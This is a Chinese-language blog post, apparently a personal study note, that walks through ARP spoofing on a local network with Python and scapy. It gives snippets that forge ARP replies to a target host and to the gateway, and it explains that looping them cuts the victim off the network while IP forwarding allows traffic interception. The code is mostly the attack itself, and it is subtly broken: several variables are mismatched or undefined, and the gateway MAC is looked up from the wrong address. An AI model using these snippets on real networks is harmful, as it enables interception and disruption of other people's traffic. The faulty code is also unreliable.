---
layout: post
title: "[python渗透学习]-局域网内的arp欺骗学习"
subtitle: 'arp欺骗'
author: "Hzy"
header-style: text
tags:
  - 渗透
---


### 1.首先得了解arp欺骗的原理，大概就是欺骗主机:我是网关，欺骗网关:我是原机主，充当中间人，达到截取的效果。

> 看看这篇文章就明白了：
* https://zhuanlan.zhihu.com/p/28818627


### 2.首先得获取网关的ip和mac地址，和本地的mac

>使用netifaces库，可以很快得到网关信息

```
import netifaces
from scapy.all import *
from scapy.layers.l2 import getmacbyip
gw = netifaces.gateways()
iface_name = gw.get(2)[0][1]
iface_ip = get_if_addr(iface_name)
gw_mac = getmacbyip(iface_ip)

```

### 3.想要欺骗的对象的ip和mac地址

```
from scapy.layers.l2 import getmacbyip
target_ips="192.168.0.100" # 假设的目标
tmac = getmacbyip(str(target_ip))
```

### 4.用scapy模拟包并发送

>欺骗目标机器，网关的ip映射为攻击者的mac

```
ptarget = Ether(src=local_mac, dst=t_mac) / ARP(hwsrc=local_mac, psrc=iface_ip, hwdst=t_mac, pdst=t_ip, op=2)
sendp(ptarget,inter=2,iface=iface_name)
```

> 欺骗网关，目标机器的ip映射为攻击者的mac

```
 pgateway = Ether(src=local_mac, dst=gw_mac) / ARP(hwsrc=local_mac, psrc=t_ip, hwdst=gw_mac, pdst=iface_ip, op=2)
 sendp(pgateway,inter=2,iface=iface_name)
```

> 写个循环大量发送，目标的主机就会发生断网的情况，这是因为没有开启ip转发。

* 网上有很多，看：https://www.jianshu.com/p/3d5ada946a31

开启ip转发就能截取到包了，像driftnet就可以获取到图片，但我还没有试过..


> 用scapy还可以做很多有趣的事情，接下来在慢慢研究。